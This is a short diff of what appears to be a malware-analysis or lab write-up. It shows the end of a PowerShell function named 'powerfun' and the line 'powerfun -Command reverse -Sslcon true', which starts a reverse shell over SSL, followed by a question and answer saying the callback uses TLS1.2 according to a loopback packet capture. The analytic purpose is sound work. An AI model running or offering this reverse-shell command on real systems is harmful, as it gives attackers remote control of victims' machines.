@@ -156,10 +156,10 @@ function powerfun
     $listener.Stop()
     }
 }
-
 powerfun -Command reverse -Sslcon true
 
   ```
+
  - What is the callback protocol at detonation?
 
    **R=** From the packet capture in the loopback interface, we can observe the callback protocol is TLS1.2
